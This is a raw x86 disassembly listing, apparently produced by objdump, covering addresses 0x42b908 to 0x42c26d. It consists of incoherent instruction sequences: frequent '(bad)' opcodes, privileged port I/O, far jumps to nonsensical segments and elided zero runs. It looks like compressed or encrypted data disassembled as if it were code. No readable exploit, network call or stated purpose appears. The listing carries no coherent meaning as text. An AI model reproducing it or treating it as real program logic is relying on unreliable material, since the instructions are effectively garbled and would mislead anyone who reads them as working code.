  42b908:	jae    0x42b8ad
  42b90a:	leave  
  42b90b:	arpl   WORD PTR [edi-0x3d],sp
  42b90e:	xchg   BYTE PTR [edi-0x31c0b0ad],dh
  42b914:	test   eax,0x2de7b13f
  42b919:	(bad)  
  42b91a:	jae    0x42b944
  42b91c:	mov    cl,0x2f
  42b91e:	inc    edx
  42b91f:	int3   
  42b920:	loop   0x42b995
  42b922:	and    dh,dl
  42b924:	mov    BYTE PTR [ebp-0x75910b41],bh
  42b92a:	scas   eax,DWORD PTR es:[edi]
  42b92b:	fmul   QWORD PTR ds:0x76c2060a
  42b931:	mov    cl,0xa0
  42b933:	push   ds
  42b934:	fild   QWORD PTR [edx-0x51]
  42b937:	mov    eax,0x6ebf8612
  42b93c:	rcr    DWORD PTR [esi+eax*8+0x7],0xf3
  42b941:	dec    esi
  42b942:	in     al,dx
  42b943:	xlat   BYTE PTR ds:[ebx]
  42b944:	xchg   BYTE PTR [ebx-0x6b6efb9a],dl
  42b94a:	aaa    
  42b94b:	mov    bl,0xc7
  42b94d:	ins    DWORD PTR es:[edi],dx
  42b94e:	push   0x49
  42b950:	pop    eax
  42b951:	or     eax,0x8343a5b0
  42b956:	lahf   
  42b957:	xchg   esi,eax
  42b958:	aam    0x54
  42b95a:	add    ebp,eax
  42b95c:	pop    eax
  42b95d:	ret    
  42b95e:	adc    eax,0x8587f44e
  42b963:	jp     0x42b9cb
  42b965:	pop    es
  42b966:	dec    eax
  42b967:	xor    BYTE PTR [ebp-0x4d],dh
  42b96a:	arpl   WORD PTR [edi],di
  42b96c:	repz imul DWORD PTR [eax]
  42b96f:	imul   eax,DWORD PTR [ebp+esi*4-0x2c],0xffffffa4
  42b974:	add    BYTE PTR [esi-0x779553ab],ah
  42b97a:	push   eax
  42b97b:	test   al,0xaa
  42b97d:	adc    ch,bl
  42b97f:	aas    
  42b980:	test   DWORD PTR [ebx+0x32],ecx
  42b983:	(bad)  
  42b984:	out    0xc1,al
  42b986:	outs   dx,BYTE PTR ds:[esi]
  42b987:	clc    
  42b988:	push   eax
  42b989:	pop    es
  42b98a:	test   eax,0xd68c8e56
  42b98f:	push   edx
  42b990:	sti    
  42b991:	scas   eax,DWORD PTR es:[edi]
  42b992:	xor    eax,0x371b9936
  42b997:	pop    edi
  42b998:	std    
  42b999:	jne    0x42b987
  42b99b:	loop   0x42b91f
  42b99d:	pop    DWORD PTR [edi]
  42b99f:	ins    DWORD PTR es:[edi],dx
  42b9a0:	and    al,BYTE PTR [esi-0x23]
  42b9a3:	inc    ecx
  42b9a4:	xor    esi,eax
  42b9a6:	mov    eax,0xd7ca73de
  42b9ab:	ss xor ebp,0xffffffe2
  42b9af:	int3   
  42b9b0:	ja     0x42b9c8
  42b9b2:	xor    bh,cl
  42b9b4:	enter  0x0,0x0
	...
  42ba14:	add    BYTE PTR [eax],al
  42ba16:	mov    eax,DWORD PTR [edi]
  42ba18:	mov    al,0xe2
  42ba1a:	mov    esp,0x316fdbf7
  42ba1f:	inc    eax
  42ba20:	sbb    cl,0x4b
  42ba23:	jnp    0x42b9c7
  42ba25:	and    eax,ebx
  42ba27:	rol    BYTE PTR [ecx],cl
  42ba29:	add    BYTE PTR [edi],al
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [eax],dh
  42ba2f:	daa    
  42ba30:	push   0x98f3ade6
  42ba35:	fsubrp st(5),st
  42ba37:	mov    bh,0xc3
  42ba39:	ret    
  42ba3a:	(bad)  
  42ba3b:	out    dx,al
  42ba3c:	out    0x60,al
  42ba3e:	sbb    cl,BYTE PTR ds:0x2126062c
  42ba44:	and    BYTE PTR [ecx+0x4944ba28],ch
  42ba4a:	mul    dh
  42ba4c:	dec    ebx
  42ba4d:	dec    ebx
  42ba4e:	retf   
  42ba4f:	xor    BYTE PTR [ebp+0x3640365e],bh
  42ba55:	mov    cl,0x96
  42ba57:	into   
  42ba58:	pop    ebp
  42ba59:	push   esi
  42ba5a:	push   ds
  42ba5b:	bound  ebp,QWORD PTR [edx-0x54]
  42ba5e:	fisub  WORD PTR [esi+0x76bc03d5]
  42ba64:	(bad)  
  42ba66:	push   ebp
  42ba67:	das    
  42ba68:	mov    DWORD PTR [ecx],esi
  42ba6a:	fild   QWORD PTR [edx+edx*2+0x37c497b]
  42ba71:	or     esp,DWORD PTR [esi+0x4b7d1f41]
  42ba77:	sub    DWORD PTR [esi-0x4a],esp
  42ba7a:	jecxz  0x42bab5
  42ba7c:	push   ecx
  42ba7d:	out    dx,eax
  42ba7e:	in     al,0x64
  42ba80:	or     BYTE PTR [ebx-0x16],al
  42ba83:	je     0x42bade
  42ba85:	inc    eax
  42ba86:	sub    BYTE PTR [esi+0x55],cl
  42ba89:	nop
  42ba8a:	mov    ds:0xd879a17c,eax
  42ba8f:	pop    ebp
  42ba90:	cmp    al,BYTE PTR [edx]
  42ba92:	inc    eax
  42ba93:	adc    dl,BYTE PTR [edx]
  42ba95:	orps   xmm3,xmm0
  42ba98:	mov    cl,BYTE PTR [esi]
  42ba9a:	mov    edx,0x7540f00a
  42ba9f:	loope  0x42bb0d
  42baa1:	aas    
  42baa2:	outs   dx,BYTE PTR ds:[esi]
  42baa3:	push   ds
  42baa4:	imul   esi,DWORD PTR [edi],0xf6bbdfbf
  42baaa:	pushf  
  42baab:	out    dx,eax
  42baac:	ds pop edx
  42baae:	out    0x66,al
  42bab0:	jge    0x42bae9
  42bab2:	adc    al,0xda
  42bab4:	ret    0x9294
  42bab7:	push   edi
  42bab8:	mov    dl,0xa9
  42baba:	sbb    ecx,edi
  42babc:	cdq    
  42babd:	pop    es
  42babe:	dec    ebx
  42babf:	xchg   edx,edi
  42bac1:	(bad)  
  42bac2:	(bad)  
  42bac3:	enter  0x6a7c,0x8a
  42bac7:	push   eax
  42bac8:	push   ss
  42bac9:	aad    0x5c
  42bacb:	(bad)  
  42bacc:	sahf   
  42bacd:	and    al,0xe1
  42bacf:	stos   BYTE PTR es:[edi],al
  42bad0:	mov    ebx,ebx
  42bad2:	xchg   edi,eax
  42bad3:	mov    bh,BYTE PTR [edi]
  42bad5:	loopne 0x42ba84
  42bad7:	stc    
  42bad8:	dec    esp
  42bad9:	addr16 mov ah,0xc3
  42badc:	add    al,0x94
  42bade:	lock pusha 
  42bae0:	(bad)  
  42bae1:	sar    DWORD PTR [ecx+0x2c6dc9a9],1
  42bae7:	or     eax,0xfbb0dd0c
  42baec:	loop   0x42ba96
  42baee:	sti    
  42baef:	popf   
  42baf0:	dec    esi
  42baf1:	jg     0x42bac2
  42baf3:	pushf  
  42baf4:	stos   BYTE PTR es:[edi],al
  42baf5:	call   0x14e79fab
  42bafa:	mov    ds:0x7384a78c,al
  42baff:	fwait
  42bb00:	(bad)  
  42bb01:	sbb    cl,BYTE PTR [ecx]
  42bb03:	fxam   
  42bb05:	outs   dx,DWORD PTR ds:[esi]
  42bb06:	sub    al,0xca
  42bb08:	mov    dl,0xdb
  42bb0a:	dec    ebx
  42bb0b:	push   ebp
  42bb0c:	shl    ebx,1
  42bb0e:	aas    
  42bb0f:	sub    bl,BYTE PTR [esi]
  42bb11:	mov    bl,al
  42bb13:	xlat   BYTE PTR ds:[ebx]
  42bb14:	push   ebx
  42bb15:	popa   
  42bb16:	stos   DWORD PTR es:[edi],eax
  42bb17:	pop    es
  42bb18:	xlat   BYTE PTR ds:[ebx]
  42bb19:	lds    ecx,FWORD PTR [eax+0x6b]
  42bb1c:	add    edx,ebp
  42bb1e:	jmp    0x8d73:0x3f93dc86
  42bb25:	fwait
  42bb26:	test   DWORD PTR [eax-0x14237b8e],0xcf2a3019
  42bb30:	xor    DWORD PTR [eax-0x67],ebx
  42bb33:	rcr    BYTE PTR [ecx+0x0],0x0
	...
  42bb93:	add    BYTE PTR [eax],al
  42bb95:	add    BYTE PTR [eax+ebp*1],dh
  42bb98:	add    DWORD PTR [esi],eax
  42bb9a:	sbb    eax,0x283a372f
  42bb9f:	in     al,0xd1
  42bba1:	and    esi,DWORD PTR [esi]
  42bba3:	shl    DWORD PTR [ebp+0x3f],cl
  42bba6:	(bad)  
  42bba8:	add    DWORD PTR [eax],eax
  42bbaa:	pop    es
  42bbab:	add    DWORD PTR [eax],eax
  42bbad:	add    BYTE PTR [ecx-0x28e506ae],cl
  42bbb3:	adc    esp,DWORD PTR [esi]
  42bbb5:	sub    al,0x42
  42bbb7:	sub    BYTE PTR [ecx],dh
  42bbb9:	cld    
  42bbba:	inc    edx
  42bbbb:	adc    esi,DWORD PTR [ecx]
  42bbbd:	sahf   
  42bbbe:	int3   
  42bbbf:	ins    DWORD PTR es:[edi],dx
  42bbc0:	xchg   esp,eax
  42bbc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbc2:	and    BYTE PTR [ebp-0x717c8b33],dh
  42bbc8:	mov    ecx,0xbcbe5621
  42bbcd:	push   ebx
  42bbce:	adc    DWORD PTR [esi+0x72058880],0x91c82eaa
  42bbd8:	repnz in al,dx
  42bbda:	(bad)  
  42bbdb:	outs   dx,DWORD PTR ds:[esi]
  42bbdc:	push   ds
  42bbdd:	sbb    ah,BYTE PTR [esi+0x5344ecd]
  42bbe3:	ja     0x42bbf4
  42bbe5:	clc    
  42bbe6:	dec    esp
  42bbe7:	mov    al,0x33
  42bbe9:	mov    ah,BYTE PTR [esi]
  42bbeb:	adc    edi,DWORD PTR [esi]
  42bbed:	dec    eax
  42bbee:	push   0x41
  42bbf0:	pusha  
  42bbf1:	clc    
  42bbf2:	jle    0x42bbd4
  42bbf4:	sub    BYTE PTR ds:0x5b05aa51,ch
  42bbfa:	bnd ret 
  42bbfc:	ret    
  42bbfd:	jecxz  0x42bb98
  42bbff:	sbb    eax,0xc72ea588
  42bc04:	aaa    
  42bc05:	inc    ebp
  42bc06:	cmp    dl,BYTE PTR [ecx+0x2a]
  42bc09:	jmp    0x42bbdd
  42bc0b:	sub    eax,0x9c558c85
  42bc10:	ret    0x9353
  42bc13:	push   0xfffffffd
  42bc15:	or     eax,0xd543f0ec
  42bc1a:	in     eax,0x42
  42bc1c:	mov    esi,0xe8dc66bc
  42bc21:	push   ds
  42bc22:	mov    edi,0xbee300d1
  42bc27:	cmp    esi,ebx
  42bc29:	int    0xb3
  42bc2b:	fisub  DWORD PTR [ecx-0x52557174]
  42bc31:	pop    ds
  42bc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc33:	fbstp  TBYTE PTR [ebx-0x32e14a7c]
  42bc39:	sub    al,0x3b
  42bc3b:	fimul  WORD PTR [ebp+0x3ef237e1]
  42bc41:	sti    
  42bc42:	pop    ebp
  42bc43:	pop    ss
  42bc44:	or     ah,BYTE PTR [ebp+0x4c]
  42bc47:	in     eax,dx
  42bc48:	push   eax
  42bc49:	lea    edx,[edx+edi*1]
  42bc4c:	dec    edi
  42bc4d:	mov    edx,0xd08356b3
  42bc52:	and    bl,bh
  42bc54:	adc    DWORD PTR [eax],eax
  42bc56:	imul   edx,DWORD PTR [edx],0xfffffff2
  42bc59:	rol    DWORD PTR [edx-0x7b],cl
  42bc5c:	pop    eax
  42bc5d:	sbb    bh,ah
  42bc5f:	cwde   
  42bc60:	xchg   ecx,eax
  42bc61:	leave  
  42bc62:	fistp  QWORD PTR [edx-0x6f]
  42bc65:	mov    al,ds:0x14200194
  42bc6a:	fdivr  QWORD PTR [ebp-0x5b]
  42bc6d:	jp     0x42bca0
  42bc6f:	ins    BYTE PTR es:[edi],dx
  42bc70:	cwde   
  42bc71:	and    eax,0x28668049
  42bc76:	test   eax,0x38bbcebf
  42bc7b:	imul   ecx,DWORD PTR [ebx+0x581d06fa],0x39
  42bc82:	xor    bh,BYTE PTR [ebx]
  42bc84:	addr16 cdq 
  42bc86:	fisub  DWORD PTR [edx+0x2f]
  42bc89:	pop    esi
  42bc8a:	sub    al,ch
  42bc8c:	xchg   ebx,eax
  42bc8d:	idiv   BYTE PTR [eax+0x1ba48e33]
  42bc93:	inc    esp
  42bc94:	sub    dh,0xfe
  42bc97:	fs call 0xe3ea:0xf318a86e
  42bc9f:	cmp    dh,bl
  42bca1:	mov    al,0x2f
  42bca3:	in     al,0xae
  42bca5:	add    ch,BYTE PTR [edi]
  42bca7:	std    
  42bca8:	dec    edx
  42bca9:	out    0x89,al
  42bcab:	stos   DWORD PTR es:[edi],eax
  42bcac:	jp     0x42bce4
  42bcae:	in     eax,0x1e
  42bcb0:	mov    bh,0xe6
  42bcb2:	push   DWORD PTR [edx+esi*8]
	...
  42bd15:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd1b:	ds mov eax,0xde938ab6
  42bd21:	stc    
  42bd22:	ror    ebp,1
  42bd24:	sub    al,0x66
  42bd26:	out    0xd4,al
  42bd28:	add    DWORD PTR [eax],eax
  42bd2a:	pop    es
  42bd2b:	add    DWORD PTR [eax],eax
  42bd2d:	add    cl,bh
  42bd2f:	mov    al,0x1a
  42bd31:	mov    eax,0x480eee8a
  42bd36:	ret    
  42bd37:	cmp    bl,BYTE PTR [ecx]
  42bd39:	dec    ebp
  42bd3a:	lods   al,BYTE PTR ds:[esi]
  42bd3b:	test   eax,0xf50dcf83
  42bd40:	pushf  
  42bd41:	sbb    BYTE PTR es:[eax+0x16],dh
  42bd45:	aas    
  42bd46:	cli    
  42bd47:	stc    
  42bd48:	xor    eax,0xaea10049
  42bd4d:	cmp    DWORD PTR [esi+0x31],esp
  42bd50:	mov    al,0xf2
  42bd52:	popa   
  42bd53:	inc    eax
  42bd54:	iret   
  42bd55:	mov    edi,0xfc7e239d
  42bd5a:	push   ss
  42bd5b:	sahf   
  42bd5c:	pusha  
  42bd5d:	fwait
  42bd5e:	adc    eax,0x41713c74
  42bd63:	sti    
  42bd64:	sahf   
  42bd65:	data16 stos BYTE PTR es:[edi],al
  42bd67:	addr16 dec esi
  42bd69:	push   ebx
  42bd6a:	sbb    al,dh
  42bd6c:	stos   DWORD PTR es:[edi],eax
  42bd6d:	sub    BYTE PTR [edi-0x17],ch
  42bd70:	ins    BYTE PTR es:[edi],dx
  42bd71:	mov    al,0x80
  42bd73:	ja     0x42bd61
  42bd75:	(bad)  
  42bd76:	jno    0x42bd71
  42bd78:	mov    ds:0xaacd8870,al
  42bd7d:	(bad)  
  42bd7e:	dec    esp
  42bd7f:	mov    esp,0xbe29b177
  42bd84:	jb     0x42bd67
  42bd86:	(bad)  
  42bd87:	sub    DWORD PTR [ebx-0x7c],edi
  42bd8a:	xor    BYTE PTR ss:[edx-0x408d33de],0xff
  42bd92:	mov    DWORD PTR [ebx-0x39],eax
  42bd95:	mov    dh,0x1a
  42bd97:	test   esi,edi
  42bd99:	pop    ecx
  42bd9a:	sbb    dl,BYTE PTR [edx+0x2]
  42bd9d:	jp     0x42bdf2
  42bd9f:	ins    DWORD PTR es:[edi],dx
  42bda0:	arpl   WORD PTR [eax+0x7a],bp
  42bda3:	cmp    bl,BYTE PTR [ecx-0x76]
  42bda6:	inc    eax
  42bda7:	lahf   
  42bda8:	and    ecx,eax
  42bdaa:	pusha  
  42bdab:	pop    eax
  42bdac:	jns    0x42be0f
  42bdae:	ret    0xac13
  42bdb1:	out    dx,al
  42bdb2:	adc    ecx,DWORD PTR [ebp-0x5d]
  42bdb5:	dec    eax
  42bdb6:	pop    eax
  42bdb7:	fistp  QWORD PTR [ebx]
  42bdb9:	shl    BYTE PTR [esi-0x4e],cl
  42bdbc:	push   0x305d5ba8
  42bdc1:	test   al,0x2d
  42bdc3:	icebp  
  42bdc4:	dec    ebp
  42bdc5:	mov    eax,ds:0x5a47e75
  42bdca:	mov    dh,0xe7
  42bdcc:	and    al,0x51
  42bdce:	in     eax,0x70
  42bdd0:	xor    BYTE PTR [eax+0x9],al
  42bdd3:	pop    es
  42bdd4:	cmp    esi,DWORD PTR [eax-0x512d15]
  42bdda:	cmp    ch,BYTE PTR [edi-0x4e]
  42bddd:	fidivr WORD PTR [ecx]
  42bddf:	jb     0x42bdc3
  42bde1:	mov    esp,0xd8bcf743
  42bde6:	shr    dh,cl
  42bde8:	scas   eax,DWORD PTR es:[edi]
  42bde9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bdea:	ins    DWORD PTR es:[edi],dx
  42bdeb:	out    0x66,al
  42bded:	imul   esp,DWORD PTR [esi-0x66],0x1d637f3
  42bdf4:	mov    edx,0xac3b243a
  42bdf9:	neg    DWORD PTR [ebp-0x4a]
  42bdfc:	in     eax,0x5
  42bdfe:	jb     0x42be6c
  42be00:	mov    ds:0xdd3f9870,eax
  42be05:	out    0x23,al
  42be07:	inc    eax
  42be08:	jge    0x42be43
  42be0a:	mov    ds:0xd0a302c7,al
  42be0f:	clc    
  42be10:	test   al,0xb2
  42be12:	ja     0x42bddf
  42be14:	jg     0x42be78
  42be16:	mov    cs,WORD PTR [eax+0x74c9b1e0]
  42be1c:	cmp    DWORD PTR [ecx],0xbbcb26ec
  42be22:	mov    eax,DWORD PTR [esi-0x7a]
  42be25:	out    dx,eax
  42be26:	mov    ss,WORD PTR [ecx-0x54fec32d]
  42be2c:	fmul   DWORD PTR [ebp+0x5e89d801]
  42be32:	outs   dx,DWORD PTR ds:[esi]
  42be33:	fnsave [eax+eax*1+0x0]
	...
  42be93:	add    BYTE PTR [eax],al
  42be95:	add    BYTE PTR [edi-0x825b8e0],dl
  42be9b:	call   FWORD PTR [edi-0x24a78c93]
  42bea1:	frstor [eax+esi*8]
  42bea4:	push   esi
  42bea5:	and    eax,0x1d5ed
  42beaa:	pop    es
  42beab:	add    DWORD PTR [eax],eax
  42bead:	add    bl,ah
  42beaf:	pop    ss
  42beb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42beb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42beb2:	adc    DWORD PTR [ebx],eax
  42beb4:	imul   esi,DWORD PTR [ebx],0xffffffed
  42beb7:	mov    ss,WORD PTR [ecx*1+0x22cf83be]
  42bebe:	scas   eax,DWORD PTR es:[edi]
  42bebf:	scas   eax,DWORD PTR es:[edi]
  42bec0:	pop    ss
  42bec1:	mov    esp,0xdc6ace38
  42bec6:	or     al,0xe0
  42bec8:	dec    esi
  42bec9:	cld    
  42beca:	mov    esp,0x8f2ad6f8
  42becf:	xlat   BYTE PTR ds:[ebx]
  42bed0:	or     ah,BYTE PTR [eax+eax*4+0xa]
  42bed4:	inc    esi
  42bed5:	stos   BYTE PTR es:[edi],al
  42bed6:	dec    ebx
  42bed7:	inc    eax
  42bed8:	test   eax,0x579928ba
  42bedd:	pop    edx
  42bede:	dec    ebp
  42bedf:	add    bl,BYTE PTR [edi]
  42bee1:	in     eax,dx
  42bee2:	les    eax,FWORD PTR [edi]
  42bee4:	sar    DWORD PTR [eax-0x45],cl
  42bee7:	jl     0x42bf0c
  42bee9:	imul   eax,DWORD PTR [ebp-0x5a],0x39d55460
  42bef0:	mov    esp,0xc2c01e53
  42bef5:	push   edx
  42bef6:	push   eax
  42bef7:	sti    
  42bef8:	sub    eax,0xacfb1965
  42befd:	mov    ah,BYTE PTR cs:[edi+0x3f]
  42bf01:	jne    0x42bf6b
  42bf03:	jne    0x42bed6
  42bf05:	lock jmp 0x42c0b303
  42bf0b:	sub    ch,bl
  42bf0d:	dec    esp
  42bf0e:	dec    eax
  42bf0f:	mov    fs,esi
  42bf11:	and    al,cl
  42bf13:	sbb    al,0x81
  42bf15:	jmp    0x9b1dd6f9
  42bf1a:	pop    es
  42bf1b:	dec    esp
  42bf1c:	cmp    ebx,DWORD PTR [ecx-0x762cda39]
  42bf22:	xchg   ebx,eax
  42bf23:	push   edx
  42bf24:	jno    0x42bf05
  42bf26:	dec    esp
  42bf27:	int3   
  42bf28:	(bad)  
  42bf29:	fmul   DWORD PTR [edi-0x32]
  42bf2c:	sub    al,bl
  42bf2e:	pusha  
  42bf2f:	rcl    ebx,0xca
  42bf32:	ss push 0x4f
  42bf35:	pop    ebp
  42bf36:	dec    esp
  42bf37:	pop    ds
  42bf38:	inc    edi
  42bf39:	aad    0x9a
  42bf3b:	rol    DWORD PTR [eax+0x44212667],1
  42bf41:	cld    
  42bf42:	repnz sub ebp,edx
  42bf45:	adc    eax,0xfb0aaf34
  42bf4a:	jl     0x42bf74
  42bf4c:	retf   0x54
  42bf4f:	pop    ds
  42bf50:	ins    DWORD PTR es:[edi],dx
  42bf51:	xor    ebp,ebx
  42bf53:	iret   
  42bf54:	lods   al,BYTE PTR ds:[esi]
  42bf55:	data16 repnz mov cl,0x2b
  42bf59:	retf   
  42bf5a:	pop    ss
  42bf5b:	jb     0x42bf79
  42bf5d:	int    0xfa
  42bf5f:	test   al,0x30
  42bf61:	ins    BYTE PTR es:[edi],dx
  42bf62:	nop
  42bf63:	fisubr WORD PTR [edx]
  42bf65:	xchg   edi,eax
  42bf66:	inc    eax
  42bf67:	call   0x7454:0x6366d3a4
  42bf6e:	lea    ecx,[ebx-0x52]
  42bf71:	xor    al,0x5e
  42bf73:	ror    BYTE PTR [esi],1
  42bf75:	cs sub dh,0xa1
  42bf79:	cmp    al,bh
  42bf7b:	mov    esp,0x6ffcdbb2
  42bf80:	mov    ebx,0xac8f3aa1
  42bf85:	cdq    
  42bf86:	xchg   esi,eax
  42bf87:	xchg   DWORD PTR [edi+0xc64675e],ecx
  42bf8d:	retf   0x84b0
  42bf90:	mov    bl,0x2b
  42bf92:	ret    0x128
  42bf95:	or     eax,0x70fdbbc1
  42bf9a:	aam    0x91
  42bf9c:	loopne 0x42bf3f
  42bf9e:	(bad)  
  42bf9f:	mov    DWORD PTR [esi+edi*2-0x17],eax
  42bfa3:	pop    edi
  42bfa4:	jmp    0x307e:0x345fdebb
  42bfab:	pop    esp
  42bfac:	cmp    eax,0x5315ec0e
  42bfb1:	mul    cl
  42bfb3:	pop    ebx
  42bfb4:	pop    edx
	...
  42c015:	add    BYTE PTR [edx],bh
  42c017:	xchg   edx,eax
  42c018:	ja     0x42c04c
  42c01a:	push   edi
  42c01c:	jg     0x42bfb8
  42c01e:	xchg   ebx,eax
  42c01f:	mov    al,ds:0xbe32f806
  42c024:	cmp    eax,0x1d6f475
  42c029:	add    BYTE PTR [edi],al
  42c02b:	add    DWORD PTR [eax],eax
  42c02d:	add    BYTE PTR [ecx-0x43],dl
  42c030:	sbb    DWORD PTR ss:[eax],esi
  42c033:	push   0xffffffa9
  42c035:	hlt    
  42c036:	fs xor esi,ecx
  42c039:	rcl    DWORD PTR [eax+0x4c],0x56
  42c03d:	outs   dx,DWORD PTR ds:[esi]
  42c03e:	ss push ss
  42c040:	inc    edx
  42c041:	push   eax
  42c042:	bound  ecx,QWORD PTR [eax-0x21]
  42c045:	jmp    DWORD PTR [eax]
  42c047:	test   al,0x99
  42c049:	mov    ah,0x94
  42c04b:	jg     0x42c040
  42c04d:	fadd   QWORD PTR [edx-0x55]
  42c050:	out    0xbe,al
  42c052:	test   BYTE PTR [ebx],ch
  42c054:	cdq    
  42c055:	enter  0xbcaa,0x9f
  42c059:	mov    ebp,0x99d64116
  42c05e:	test   al,0x1a
  42c060:	call   0xb57f:0xce38bea2
  42c067:	scas   eax,DWORD PTR es:[edi]
  42c068:	rcr    DWORD PTR gs:[eax-0x7a5bdec5],1
  42c06f:	cmp    eax,0xb7a05fd9
  42c074:	xor    edi,0x720943b1
  42c07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c07b:	cmp    esi,eax
  42c07d:	cwde   
  42c07e:	jp     0x42c06f
  42c080:	(bad)  
  42c081:	cmp    edx,DWORD PTR [edi-0x6b01a45b]
  42c087:	shr    BYTE PTR [edi],cl
  42c089:	retf   
  42c08a:	in     eax,0x96
  42c08c:	je     0x42c012
  42c08e:	mov    edi,0x153353ad
  42c093:	jae    0x42c0a4
  42c095:	mov    esi,0x64c39b27
  42c09a:	mov    DWORD PTR [edi],esp
  42c09c:	je     0x42c0f4
  42c09e:	fwait
  42c09f:	pop    esi
  42c0a0:	add    eax,0xad37fe48
  42c0a5:	xor    BYTE PTR [ebx],bh
  42c0a7:	popa   
  42c0a8:	jno    0x42c0f1
  42c0aa:	jnp    0x42c10b
  42c0ac:	mov    bl,dh
  42c0ae:	or     dh,bh
  42c0b0:	pop    ss
  42c0b1:	adc    cl,ah
  42c0b3:	lods   eax,DWORD PTR ds:[esi]
  42c0b4:	mov    BYTE PTR [esi+0x72],bl
  42c0b7:	es in  eax,0x5e
  42c0ba:	jo     0x42c139
  42c0bc:	das    
  42c0bd:	sbb    bl,ah
  42c0bf:	fcom   QWORD PTR [edx]
  42c0c1:	lods   eax,DWORD PTR ds:[esi]
  42c0c2:	pop    es
  42c0c3:	mov    ch,0x18
  42c0c5:	and    esp,0xb06d2c8a
  42c0cb:	outs   dx,DWORD PTR ds:[esi]
  42c0cc:	in     ax,0xb8
  42c0cf:	push   esp
  42c0d0:	ss inc esi
  42c0d2:	or     BYTE PTR [ebp+0x2e6fe292],ah
  42c0d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c0d9:	addr16 mov edi,0x1cbef2fe
  42c0df:	hlt    
  42c0e0:	lods   eax,DWORD PTR ds:[esi]
  42c0e1:	addr16 jmp 0xb07c:0x5af26680
  42c0e9:	sbb    al,0x54
  42c0eb:	pop    edx
  42c0ec:	(bad)  
  42c0ed:	cs aas 
  42c0ef:	sti    
  42c0f0:	in     eax,0xff
  42c0f2:	and    eax,0x1ba6238a
  42c0f7:	ss ja  0x42c16f
  42c0fa:	push   ebp
  42c0fb:	mov    DWORD PTR [edx+0x18],edi
  42c0fe:	call   0x897e3b1c
  42c103:	into   
  42c104:	adc    esi,DWORD PTR [ebp-0x42]
  42c107:	imul   ebp,DWORD PTR [eax],0x1e
  42c10a:	sbb    eax,DWORD PTR [ecx-0x53]
  42c10d:	add    bl,BYTE PTR [eax]
  42c10f:	push   0x3efaac66
  42c114:	dec    esi
  42c115:	dec    esi
  42c116:	ins    DWORD PTR es:[edi],dx
  42c117:	dec    ebx
  42c118:	and    al,0x1c
  42c11a:	mov    ebx,0x2d67a301
  42c11f:	mov    DWORD PTR [ebx+0x1d3b47b6],ebp
  42c125:	mov    bl,0x35
  42c127:	cdq    
  42c128:	sub    al,BYTE PTR [esi-0x7d]
  42c12b:	aam    0x3a
  42c12d:	jmp    0x7440c0d6
  42c132:	inc    ebp
  42c133:	jno    0x42c118
	...
  42c195:	add    BYTE PTR [ecx-0x7e],ch
  42c198:	int    0xae
  42c19a:	out    dx,eax
  42c19b:	out    dx,eax
  42c19c:	imul   eax,edi,0xffffffa4
  42c19f:	aas    
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	inc    eax
  42c1a3:	fild   WORD PTR [ebx]
  42c1a5:	mov    dh,0xfb
  42c1a7:	xlat   BYTE PTR ds:[ebx]
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    BYTE PTR [esi],ch
  42c1af:	test   edx,ecx
  42c1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c1b2:	jge    0x42c1ee
  42c1b4:	imul   eax,DWORD PTR [esi+0x20b8ef39],0x65813c2d
  42c1be:	arpl   WORD PTR [esp+eiz*4+0x1ec0a78a],sp
  42c1c5:	psubsb mm6,mm1
  42c1c8:	imul   edi,DWORD PTR ds:0x82a817a8,0xffffffd9
  42c1cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1d0:	adc    eax,0xd3ff2a32
  42c1d5:	and    al,BYTE PTR [ebx+0x15]
  42c1d8:	sub    eax,0x3c0eeb3b
  42c1dd:	mov    gs,WORD PTR [eax-0x2c]
  42c1e0:	sbb    ebp,DWORD PTR [edi]
  42c1e2:	je     0x78fd766f
  42c1e8:	jmp    0xc439:0x82814f69
  42c1ef:	loopne 0x42c1e7
  42c1f1:	into   
  42c1f2:	outs   dx,DWORD PTR ds:[esi]
  42c1f3:	mov    BYTE PTR [edx-0x1a],cl
  42c1f6:	inc    esp
  42c1f7:	lahf   
  42c1f8:	call   0x5573:0x4c5eb5d
  42c1ff:	je     0x42c188
  42c201:	cmp    DWORD PTR [ebx+edi*2-0x2334fa74],ebx
  42c208:	jecxz  0x42c27d
  42c20a:	mov    edx,0x8a6ba455
  42c20f:	ins    BYTE PTR es:[edi],dx
  42c210:	dec    esi
  42c211:	add    dh,bh
  42c213:	xchg   BYTE PTR cs:[esi+ebx*1-0x55d99abb],al
  42c21b:	in     eax,dx
  42c21c:	xchg   DWORD PTR [ebp-0x6f],ecx
  42c21f:	hlt    
  42c220:	pop    eax
  42c221:	inc    edi
  42c222:	into   
  42c223:	add    BYTE PTR [esi+0xbdfdeed],0xf8
  42c22a:	or     eax,0xa9d8bb3c
  42c22f:	(bad)  
  42c230:	gs mov ah,0x10
  42c233:	(bad)  
  42c234:	jo     0x42c1b7
  42c236:	or     eax,0x5a31aba6
  42c23b:	push   0x61b1c2d7
  42c240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c241:	or     eax,DWORD PTR ss:[ebx-0x13]
  42c245:	out    0xbc,eax
  42c247:	adc    ecx,DWORD PTR [eax+0x12]
  42c24a:	iret   
  42c24b:	cmp    al,0x10
  42c24d:	and    ebx,DWORD PTR [ebp-0x1cffacbb]
  42c253:	jecxz  0x42c220
  42c255:	sub    eax,0x16356c8d
  42c25a:	lahf   
  42c25b:	mov    ecx,0x6b58e2fd
  42c260:	xchg   edi,eax
  42c261:	ss ins BYTE PTR es:[edi],dx
  42c263:	pop    es
  42c264:	push   ecx
  42c265:	mov    ch,0x72
  42c267:	add    BYTE PTR [edi],bh
  42c269:	jno    0x42c274
  42c26b:	out    0xed,al
  42c26d:	pop    ss
